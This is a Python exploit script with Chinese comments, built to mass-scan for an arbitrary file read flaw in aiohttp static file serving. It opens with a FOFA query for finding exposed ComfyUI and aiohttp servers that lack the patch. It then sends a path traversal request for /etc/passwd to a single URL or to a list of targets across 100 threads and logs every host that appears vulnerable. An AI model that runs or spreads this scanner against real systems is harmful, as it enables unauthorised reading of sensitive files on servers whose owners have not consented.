# aiohttp-static-任意文件读取漏洞

#fofa语法：title=="ComfyUI" || (app="AIOHTTP" && server!="aiohttp/3.9.3" && server!="aiohttp/3.9.2")

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

        _       _     _   _                   _        _   _      
       (_)     | |   | | | |                 | |      | | (_)     
   __ _ _  ___ | |__ | |_| |_ _ __ ______ ___| |_ __ _| |_ _  ___ 
  / _` | |/ _ \| '_ \| __| __| '_ \______/ __| __/ _` | __| |/ __|
 | (_| | | (_) | | | | |_| |_| |_) |     \__ \ || (_| | |_| | (__ 
  \__,_|_|\___/|_| |_|\__|\__| .__/      |___/\__\__,_|\__|_|\___|
                             | |                                  
                             |_|                                                                                                                           
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="aiohttp-static")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/static/./../../../../../../../../etc/passwd'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': 'http://120.55.55.172:8082/',
        'Connection': 'close',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
    }
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,verify=False)
        if res.status_code == 200:
            print(f"f[+]该url存在任意文件读取漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件读取漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()